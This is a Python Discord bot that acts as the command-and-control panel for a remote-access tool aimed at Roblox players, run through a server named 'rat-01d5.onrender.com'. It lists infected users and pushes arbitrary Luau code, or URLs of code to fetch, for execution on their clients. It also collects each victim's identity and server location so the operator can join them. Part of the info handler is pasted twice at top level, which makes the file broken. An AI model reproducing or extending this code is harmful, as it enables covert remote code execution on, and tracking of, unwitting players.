import discord
from discord import TextChannel
from discord import app_commands
import requests
import os
import asyncio

class MyClient(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.messages = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.active_users = set()
        self.clear_confirmations = set()  # track who confirmed once

    async def on_ready(self):
        await self.tree.sync()
        print(f"online as {self.user}")
        asyncio.create_task(self.poll_active_users())

    async def poll_active_users(self):
        await self.wait_until_ready()
        guild = discord.utils.get(self.guilds, id=1392242413740883968)
        if not guild:
            print("guild not found")
            return

        while True:
            try:
                category = discord.utils.get(guild.categories, name="users")
                response = requests.get("https://rat-01d5.onrender.com/active")
                if response.status_code == 200:
                    new_active_users = set(response.json())

                    added = new_active_users - self.active_users
                    removed = self.active_users - new_active_users

                    for uid in added:
                        channel = discord.utils.get(guild.text_channels, name=uid)
                        if not channel:
                            if category:
                                channel = await guild.create_text_channel(uid, category=category)
                            else:
                                print("category not found.. creating channel outside category...")
                                channel = await guild.create_text_channel(uid)
                        await channel.send("online")

                    for uid in removed:
                        channel = discord.utils.get(guild.text_channels, name=uid)
                        if channel:
                            await channel.send("offline")

                    self.active_users = new_active_users

                else:
                    print("failed to poll active users:", response.status_code)

            except Exception as e:
                print("error polling:", e)
            await asyncio.sleep(5)

client = MyClient()

@client.tree.command(name="print", description="print smth")
@app_commands.describe(arg="text 2 print")
async def print_command(interaction: discord.Interaction, arg: str):
    channel = interaction.channel
    if not isinstance(channel, TextChannel):
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    uid = channel.name

    if not uid.isdigit():
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    if uid not in client.active_users:
        await interaction.response.send_message("offline", ephemeral=True)
        return

    payload = {"to": uid, "command": "print", "args": arg}

    try:
        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
        if res.status_code == 200:
            await interaction.response.send_message(f"ran `{uid}`.")
        else:
            await interaction.response.send_message("failed to talk 2 server", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"error {e}", ephemeral=True)

@client.tree.command(name="loadstring", description="print('hi')")
@app_commands.describe(code="LuaU code")
async def loadstring_command(interaction: discord.Interaction, code: str):
    channel = interaction.channel
    if not isinstance(channel, TextChannel):
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    uid = channel.name

    if not uid.isdigit():
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    if uid not in client.active_users:
        await interaction.response.send_message("offline", ephemeral=True)
        return

    payload = {"to": uid, "command": "loadstring", "args": code}

    try:
        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
        if res.status_code == 200:
            await interaction.response.send_message("ran loadstring", ephemeral=False)
        else:
            await interaction.response.send_message("failed to talk to server", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"error {e}", ephemeral=True)

@client.tree.command(name="hloadstring", description="fetch code from a website")
@app_commands.describe(url="website URL")
async def hloadstring_command(interaction: discord.Interaction, url: str):
    channel = interaction.channel
    if not isinstance(channel, TextChannel):
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    uid = channel.name

    if not uid.isdigit():
        await interaction.response.send_message("invalid channel", ephemeral=True)
        return

    if uid not in client.active_users:
        await interaction.response.send_message("offline", ephemeral=True)
        return

    payload = {"to": uid, "command": "hloadstring", "args": url}

    try:
        res = requests.post("https://rat-01d5.onrender.com/send", json=payload)
        if res.status_code == 200:
            await interaction.response.send_message("sent hloadstring", ephemeral=False)
        else:
            await interaction.response.send_message("failed to talk to server", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"error {e}", ephemeral=True)

from discord import ui, ButtonStyle, Colour

@client.tree.command(name="info", description="user info")
async def info_command(interaction: discord.Interaction):
    channel = interaction.channel
    if not isinstance(channel, TextChannel):
        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
        return

    userid = channel.name

    if not userid.isdigit():
        await interaction.response.send_message("WRONG CHANNEL", ephemeral=True)
        return

    if userid not in client.active_users:
        await interaction.response.send_message("offline", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=False)
    
    import aiohttp
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://rat-01d5.onrender.com/info_report/{userid}") as resp:
            if resp.status != 200:
                await interaction.followup.send("no info twin", ephemeral=True)
                return
            info = await resp.json()

    displayname = info.get("displayname", "Unknown")
    username = info.get("username", "unknown_user")
    gameid = info.get("placeid", "0")
    jobid = info.get("jobid", "")
    commongn = {"8986335348": "Mortem-Metallum", "4169490976": "Mortem-Metallum-Alpha"}

    if gameid in commongn:
        gamename = commongn[gameid]
        roblox_url = f"https://www.roblox.com/games/{gameid}/{gamename}?serverJobId={jobid}"
    else:
        roblox_url = f"https://www.roblox.com/games/{gameid}/?serverJobid={jobid}"

from discord import ui, ButtonStyle

displayname = info.get("displayname", "Unknown")
username = info.get("username", "unknown_user")
gameid = info.get("placeid", "0")
jobid = info.get("jobid", "")
userid = info.get("userid", "N/A")

# Define custom game names for known game IDs
custom_game_names = {
    "8986335348": "Mortem-Metallum",
    "4169490976": "Mortem-Metallum-Alpha"
}

# Construct Roblox game URL
if gameid in custom_game_names:
    gamename = custom_game_names[gameid]
    roblox_url = f"https://www.roblox.com/games/{gameid}/{gamename}?serverJobId={jobid}"
else:
    roblox_url = f"https://www.roblox.com/games/{gameid}/?serverJobid={jobid}"

profile_url = f"https://www.roblox.com/users/{userid}/profile"

embed = discord.Embed(title="Information")
embed.add_field(name="Username", value=f"@{username}", inline=False)
embed.add_field(name="UserID", value=userid)
embed.add_field(name="Game", value=info.get("game", "N/A"))
embed.add_field(name="PlaceID", value=gameid)
embed.add_field(name="JobID", value=jobid)

class RobloxButton(ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(
            ui.Button(
                label="Join Server",
                url=roblox_url,
                style=ButtonStyle.link
            )
        )
        self.add_item(
            ui.Button(
                label="View Profile",
                url=profile_url,
                style=ButtonStyle.link
            )
        )

await interaction.followup.send(embed=embed, view=RobloxButton(), ephemeral=True)



@client.tree.command(name="cleardb", description="clears database")
@app_commands.describe(confirm="type 'doitretard' to force clear")
async def clear_active_command(interaction: discord.Interaction, confirm: str = None):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("kid u got no perms", ephemeral=True)
        return

    author_id = interaction.user.id
    DEL_KEY = os.getenv("delkey")

    async def run_clear():
        await interaction.response.defer(ephemeral=True)
        try:
            res = requests.post("https://rat-01d5.onrender.com/clear_active", json={"key": DEL_KEY})
            if res.status_code == 200:
                guild = discord.utils.get(client.guilds, id=1392242413740883968)
                if guild:
                    category = discord.utils.get(guild.categories, name="users")
                    if category:
                        for ch in category.channels:
                            await ch.delete()
                client.active_users.clear()
                await interaction.followup.send("cleared DB + channels", ephemeral=True)
            else:
                await interaction.followup.send(
                    f"failed to clear DB\nstatus: {res.status_code}\ntext: {res.text}",
                    ephemeral=True
                )
        except Exception as e:
            await interaction.followup.send(f"error: {e}", ephemeral=True)

    if confirm == "doitretard":
        await run_clear()
        return

    if author_id not in client.clear_confirmations:
        client.clear_confirmations.add(author_id)
        await interaction.response.send_message(
            "run the cmd again within 30 seconds to confirm\n"
            "or use `/clear_active doitretard` to force clear",
            ephemeral=True
        )
        async def clear_confirmation():
            await asyncio.sleep(30)
            client.clear_confirmations.discard(author_id)
        asyncio.create_task(clear_confirmation())
    else:
        await run_clear()
        client.clear_confirmations.discard(author_id)





client.run(os.getenv("TOKEN"))
